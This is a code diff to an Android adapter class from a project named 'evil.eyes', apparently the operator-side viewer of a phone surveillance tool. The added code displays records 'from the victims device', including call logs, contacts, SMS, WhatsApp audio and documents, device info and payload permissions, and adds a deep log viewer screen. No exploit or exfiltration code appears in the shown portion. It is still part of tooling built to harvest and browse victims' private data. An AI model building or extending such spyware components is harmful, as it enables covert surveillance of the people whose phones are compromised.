@@ -21,6 +21,7 @@ import evil.eyes.core.RecentModel;
 import evil.eyes.core.utils.PayloadTypes;
 import evil.eyes.core.utils.TimeUtils;
 import evil.eyes.ui.ContactsDisplay;
+import evil.eyes.ui.DeepLogViwer;
 import evil.eyes.ui.PhoneDisplay;
 import evil.eyes.ui.SmsDisplay;
 
@@ -56,19 +57,28 @@ public class RecentAdapter extends RecyclerView.Adapter<RecentAdapter.ViewHolder
         holder.tittle.setText(recentModel.getName());
         holder.recordTime.setText(isDetailedRecord ? "Fetched on: " + TimeUtils.getTimeFromTimeStamp(recentModel.timeStamp) : "Fetched on : Latest (last time)");
         holder.separator.setImageDrawable(holder.itemView.getContext().getDrawable(getName(recentModel.key)));
-        holder.desc.setText(getDescription(recentModel.key));
+
+        if (!isDetailedRecord) {
+            holder.open_more.setOnClickListener(oo -> {
+                holder.desc.setText(getDescription(recentModel.key));
+                holder.itemView.getContext().startActivity(new Intent(holder.itemView.getContext(), DeepLogViwer.class).putExtra("key", recentModel.key));
+            });
+        }else {
+            holder.desc.setText("Fetched "+recentModel.name+" Records from the victims device on "+TimeUtils.getTimeFromTimeStamp(recentModel.timeStamp));
+        }
         holder.button_record.setOnClickListener(l -> {
-            if (recentModel.name.equalsIgnoreCase("CALL LOGS")) {
+            if (recentModel.name.equalsIgnoreCase("CALL LOGS") || recentModel.name.equalsIgnoreCase("calls")) {
                 holder.itemView.getContext().startActivity(new Intent(holder.itemView.getContext(), PhoneDisplay.class).putExtra("uri", recentModel.link));
-            } else if (recentModel.name.equalsIgnoreCase("CONTACTS LOGS")) {
+            } else if (recentModel.name.equalsIgnoreCase("CONTACTS LOGS") || recentModel.name.equalsIgnoreCase("contacts")) {
                 holder.itemView.getContext().startActivity(new Intent(holder.itemView.getContext(), ContactsDisplay.class).putExtra("uri", recentModel.link));
             } else if (recentModel.name.contains("SMS") || recentModel.name.contains("sms")) {
                 holder.itemView.getContext().startActivity(new Intent(holder.itemView.getContext(), SmsDisplay.class).putExtra("uri", recentModel.link));
-            }else if (recentModel.name.equalsIgnoreCase("BATTERY INFO") ||
+            } else if (recentModel.name.equalsIgnoreCase("BATTERY INFO") ||
                     recentModel.name.equalsIgnoreCase("Payload permission Info") ||
                     recentModel.name.equalsIgnoreCase("Device Info")) {
                 //TODO JSON VIEWER
-            }else {
+
+            } else {
                 Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(recentModel.link));
                 holder.itemView.getContext().startActivity(browserIntent);
             }
@@ -85,7 +95,7 @@ public class RecentAdapter extends RecyclerView.Adapter<RecentAdapter.ViewHolder
 
         private CardView cardView;
         private TextView tittle, recordTime, desc;
-        private ImageView separator;
+        private ImageView separator,open_more;
         private AppCompatButton button_record;
 
         public ViewHolder(@NonNull View itemView) {
@@ -97,7 +107,10 @@ public class RecentAdapter extends RecyclerView.Adapter<RecentAdapter.ViewHolder
             separator = itemView.findViewById(R.id.jk);
             desc = itemView.findViewById(R.id.desc);
             button_record = itemView.findViewById(R.id.button_record);
+            open_more = itemView.findViewById(R.id.rm);
 
+            if (isDetailedRecord) open_more.setVisibility(View.GONE);
+            else open_more.setVisibility(View.VISIBLE);
         }
     }
 
@@ -112,7 +125,6 @@ public class RecentAdapter extends RecyclerView.Adapter<RecentAdapter.ViewHolder
                 break;
             case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_AUDIO:
                 name = R.drawable.volume;
-                ;
                 break;
             case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_DOCUMENTS:
                 name = R.drawable.documents;
